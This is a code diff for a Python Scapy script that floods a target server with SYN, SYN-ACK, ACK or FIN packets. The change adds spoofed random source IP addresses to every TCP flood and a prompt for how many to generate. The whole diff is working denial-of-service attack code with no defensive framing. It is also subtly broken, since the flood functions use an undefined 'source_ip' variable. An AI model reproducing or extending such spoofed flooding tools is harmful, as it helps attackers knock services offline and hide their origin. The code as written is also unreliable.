@@ -76,7 +76,7 @@ def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
 def syn_flood_attack(server_ip, server_port, count, progress_bar):
      global sent_packets, start_time
      while sent_packets < count:
-        syn_flood = IP(dst=server_ip)/TCP(dport=server_port,flags="S",seq=RandShort()) #Set the syn flag to 1 only
+        syn_flood = IP(src=source_ip,dst=server_ip)/TCP(dport=server_port,flags="S",seq=RandShort()) #Set the syn flag to 1 only
         send(syn_flood, verbose=0)
         with sent_packets_lock:
             sent_packets += 1
@@ -89,7 +89,7 @@ def syn_flood_attack(server_ip, server_port, count, progress_bar):
 def synack_flood_attack(server_ip, server_port, count, progress_bar):
      global sent_packets, start_time
      while sent_packets < count:
-        synack_flood = IP(dst=server_ip)/TCP(dport=server_port,flags="SA",seq=RandShort()) #Set the syn-ack flag to 1 only
+        synack_flood = IP(src=source_ip,dst=server_ip)/TCP(dport=server_port,flags="SA",seq=RandShort()) #Set the syn-ack flag to 1 only
         send(synack_flood, verbose=0)
         with sent_packets_lock:
             sent_packets += 1
@@ -102,7 +102,7 @@ def synack_flood_attack(server_ip, server_port, count, progress_bar):
 def ack_flood_attack(server_ip, server_port, count, progress_bar):
      global sent_packets, start_time
      while sent_packets < count:
-        ack_flood = IP(dst=server_ip)/TCP(dport=server_port,flags="A",seq=RandShort()) #Set the ack flag to 1 only
+        ack_flood = IP(src=source_ip,dst=server_ip)/TCP(dport=server_port,flags="A",seq=RandShort()) #Set the ack flag to 1 only
         send(ack_flood, verbose=0)
         with sent_packets_lock:
             sent_packets += 1
@@ -115,7 +115,7 @@ def ack_flood_attack(server_ip, server_port, count, progress_bar):
 def fin_flood_attack(server_ip, server_port, count, progress_bar):
      global sent_packets, start_time
      while sent_packets < count:
-        fin_flood = IP(dst=server_ip)/TCP(dport=server_port,flags="F",seq=RandShort())
+        fin_flood = IP(src=source_ip,dst=server_ip)/TCP(dport=server_port,flags="F",seq=RandShort())
         send(fin_flood, verbose=0)
         with sent_packets_lock:
             sent_packets += 1
@@ -174,6 +174,14 @@ def main():
     elif Protocol == 2:
         attack_number = int(input("Choose an attack: \n1. Syn Flood Attack\n2. Syn-Ack Flood Attack\n3. Ack Flood Attack\n4. Fin Flood Attack\nEnter the attack number: "))
         number_of_packets = int(input("Enter the number of times to execute the attack: "))
+        number_of_source_ips = int(input("Enter the number of source IP addresses to generate: "))
+
+        # List of source IP addresses to use (replace with actual IPs)
+        source_ips = []
+
+        # Generate additional random source IP addresses
+        for _ in range(number_of_source_ips):
+            source_ips.append(generate_random_ip())
 
         start_time = time.time()  # Record the start time
 
